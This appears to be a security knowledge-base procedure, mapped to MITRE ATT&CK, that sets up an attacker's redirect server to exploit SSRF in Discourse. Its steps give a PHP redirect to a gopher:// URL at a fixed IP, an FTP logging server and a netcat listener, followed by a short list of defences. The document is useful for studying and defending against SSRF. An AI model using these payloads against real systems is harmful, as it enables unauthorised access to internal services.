---
id: proc-setup-redirect-server
tags:
  - ssrf
  - redirect
  - php
type: procedure
tools:
  - '[[tools/Vsftpd]]'
  - '[[tools/Netcat]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/php-redirect-to-gopher]]'
  - '[[commands/php-redirect-to-ftp]]'
  - '[[commands/nc-listener]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.105Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Setup-Malicious-Redirect-Server

## Summary

This procedure sets up an attacker's web server with PHP redirect scripts to abuse protocols like Gopher and FTP, enabling SSRF exploitation when the target fetches the image URL.

## Description

In the context of Discourse SSRF, host PHP files that issue 302 redirects to arbitrary URLs. This tricks the Ruby-based server into following non-HTTP protocols or internal hosts. Prerequisites include a publicly accessible web server (e.g., Apache with PHP) and FTP setup for logging. Expected outcomes: Target server initiates connections to specified endpoints upon image fetch.

## Requirements

1. Public IP and domain for attacker server (e.g., 192.166.218.53)
2. PHP-enabled web server (Apache/Nginx)
3. FTP server like vsftpd for protocol testing
4. Netcat for TCP listening

## Defense

Defensive measures and detection strategies:

- Validate and whitelist URLs in image uploads (block ftp://, gopher://, localhost)
- Disable redirect following in HTTP clients (e.g., configure Ruby Net::HTTP)
- Monitor outbound connections from app servers to unusual IPs/protocols
- Use network segmentation to isolate internal services

## Objectives

1. Create redirect payloads for protocol abuse
2. Verify server accessibility
3. Prepare for log monitoring

## Instructions

### Step 1: Create PHP Redirect Script

**Context**: Write a PHP file to redirect to a target protocol/host, e.g., Gopher for arbitrary TCP.

**Command** ([[commands/php-redirect-to-gopher]]):
```php
<?php header('Location: gopher://192.166.218.53:80/test123'); ?>
```

> This script returns a 302 redirect when accessed via HTTP, forcing the fetcher to connect via Gopher to /test123 on port 80. Save as malicious3.php in web root.

### Step 2: Setup FTP Server

**Context**: Run vsftpd to log incoming FTP connections from SSRF.

**Command** (no specific command, tool config):
Use [[tools/Vsftpd]] default config to listen on port 21.

> Expected: Logs in /var/log/vsftpd.log showing connections from target IP.

### Step 3: Start Netcat Listener

**Context**: Listen for raw TCP connections, e.g., from Gopher or query params.

**Command** ([[commands/nc-listener]]):
```bash
nc -l 1337
```

> Binds to port 1337; captures GET requests from Ruby client. Expected: Incoming HTTP-like request with Ruby User-Agent.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/php-redirect-to-gopher]]
- [[commands/php-redirect-to-ftp]]
- [[commands/nc-listener]]

## Tools Used

- [[tools/Vsftpd]]
- [[tools/Netcat]]

## Tags

- ssrf
- redirect
- setup
